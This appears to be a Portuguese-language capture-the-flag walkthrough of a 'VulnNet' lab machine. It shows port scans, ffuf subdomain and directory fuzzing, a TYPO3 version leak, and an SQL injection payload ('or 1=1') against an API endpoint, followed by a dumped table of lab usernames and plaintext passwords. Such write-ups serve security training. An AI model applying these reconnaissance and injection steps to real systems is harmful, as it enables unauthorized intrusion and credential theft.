rustscan:

Open 10.65.184.102:22
Open 10.65.184.102:80

nmap:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


descobrindo o tamanho da resposta para fuzing de subdominios:

1 - ffuf -u http://vulnnet.thm -H "Host: teste.vulnnet.thm" -w <(echo teste)
2 - curl -H "Host: testeinvalido.vulnnet.thm" http://vulnnet.thm -I


subdominios válidos para vulnnet.thm FUZING:

ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w ~/Downloads/Wordlists/subdomain.txt -i -ic -mc 200,301,302,401,403 -c -fs 65

shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 152ms]
blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 154ms]
api   	                  [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 155ms]
API                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 155ms]
api                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 153ms]
blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 153ms]
shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 152ms]
admin1                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 152ms]


dominio principal FUZING:

ffuf -u http://admin1.vulnnet.thm/FUZZ -H "Host: admin1.vulnnet.thm" -w ~/Downloads/Wordlists/admin.txt -i -ic -mc 200,301,302,401 -c

retornou algo interessante:

typo3                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 149ms]
vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 509ms]
vendor/                 [Status: 200, Size: 3526, Words: 221, Lines: 30, Duration: 149ms]
composer.json           [Status: 200, Size: 11190, Words: 369, Lines: 272, Duration: 148ms]
composer.lock           [Status: 200, Size: 290942, Words: 125514, Lines: 8190, Duration: 262ms]
fileadmin/              [Status: 200, Size: 1151, Words: 76, Lines: 18, Duration: 151ms]
fileadmin               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 149ms]
typo3/                  [Status: 200, Size: 10843, Words: 2585, Lines: 160, Duration: 3870ms]
fileadmin/              [Status: 200, Size: 1151, Words: 76, Lines: 18, Duration: 145ms]


typo3 -> cms
em /vendor/composer/installed.json tem a versão do cms:

{ name: "typo3/cms-cli", version: "2.0.0", version_normalized: "2.0.0.0", … }


http://blog.vulnnet.thm/ USERNAMES AQUI

jane
sal
mary
steve


o endpoint: http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1
é vulnerável a sqlinjection

http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1000 or 1=1
retorna conteudo normal!

DATABASE DUMPADA:

+--------------------+---------------------+-----+
| username           | password            | id  |
+--------------------+---------------------+-----+
 ...
| lspikinsaz         | D8Gbl8mnxg          | 396 |
| profeb0            | kLLxorKfd           | 397 |
| sberrymanb1        | cdXAJAR             | 398 |
| ajefferiesb2       | 0hdeFiZBRJ          | 399 |
| hkibblewhiteb3     | 6rl6qXSJDrr         | 400 |
| dtremayneb4        | DuYMuI              | 401 |
| bflewinb5          | fwbk0Vgo            | 402 |
| kmolineuxb6        | 92Fb3vBF5k75        | 403 |
| fjosefsb7          | zzh9wheBjX          | 404 |
| tmiskellyb8        | sAGTlyBrb5r         | 405 |
| nallrightb9        | 3uUPdL              | 406 |
| hlevermoreba       | fp2LW0x             | 407 |
| celgerbb           | IKhg7D              | 408 |
| frustedbc          | Tjyu2Ch2            | 409 |
| imeneghibd         | NgKgdeKRVEK         | 410 |
| vgouninbe          | wGWMg3d             | 411 |
| cbartoschbf        | ruTxBc2n85          | 412 |
| lcordonbg          | ZydELwZFV2          | 413 |
| dappsbh            | ROfVmvZSYS          | 414 |
| zduchanbi          | B4SBGt5yAD          | 415 |
| jfraybj            | zhE95JJX9l          | 416 |
| mlanchesterbk      | nXSVHhVW9S          | 417 |
| cgylesbl           | NCeU070             | 418 |
| cbonnifacebm       | WzkvfoedkXJx        | 419 |
| btoppasbn          | ktPBpK1             | 420 |
| mdurrettbo         | 8fCXE6BF9gj         | 421 |
| skilroybp          | cSAjOy              | 422 |
| uvonderemptenbq    | HLUHZ9oQ            | 423 |
| dvinsenbr          | gTc7TiSsd2          | 424 |
| ltiltbs            | 7yQ0b1B             | 425 |
| dsimcoebt          | SXD1eC6ysa          | 426 |
| wfrailbu           | bgb084kq            | 427 |
| lmityukovbv        | NsJFz4DLpI          | 428 |
| vkellarbw          | 7JVPatN             | 429 |
| rkingstonbx        | yuTnSPEvIoJ4        | 430 |
| rbakewellby        | L3ttm8              | 431 |
| dbousteadbz        | vyae6t              | 432 |
| vstaddenc0         | iA4AD4UlcLF1        | 433 |
| rwhacketc1         | VlyIAh              | 434 |
| tnoorc2            | IpsnIEbIaT          | 435 |
| dduffync3          | UPU9rZu8q           | 436 |
| dstichelc4         | xuUXUFXoc           | 437 |
| kcleverlyc5        | yTuqouj9ZK          | 438 |
| sreinertc6         | QDneobZ1DH          | 439 |
| mcottinghamc7      | OdrnoHtrP           | 440 |
| ljansemac8         | c3KvR6              | 441 |
| acodac9            | GMbFP9              | 442 |
| rhuggardca         | zIZ11OPuj           | 443 |
| gkeechcb           | XCX2GVx             | 444 |
| syurincc           | nJQgYR2uOyZq        | 445 |
| agaulecd           | AQlFlPvf            | 446 |
| wboijce            | zj6vR6Bf            | 447 |
| kphifercf          | eL5uJnLD2           | 448 |
| abenglecg          | 7HEMdTc07           | 449 |
| emarkingch         | VbzVZoYn            | 450 |
| nmuldowneyci       | wln8WN3PJ           | 451 |
| jbygrovecj         | 3AcKBTHRN           | 452 |
| bduxburyck         | 32ZXql9Uw8          | 453 |
| fthewcl            | 2pnBsk6i            | 454 |
| kmeececm           | JxcEXKAN            | 455 |
| bholligancn        | rkyCMLwOIt          | 456 |
| bferonetco         | KlxQ4Vxl            | 457 |
| jcraycp            | OFc5f2              | 458 |
| hethertoncq        | SsLMTxbw            | 459 |
| cclayecr           | nUpdnCZW1cqr        | 460 |
| tmcbreartycs       | 0I7ldSNbm           | 461 |
| oderuggieroct      | gqQeawiZ            | 462 |
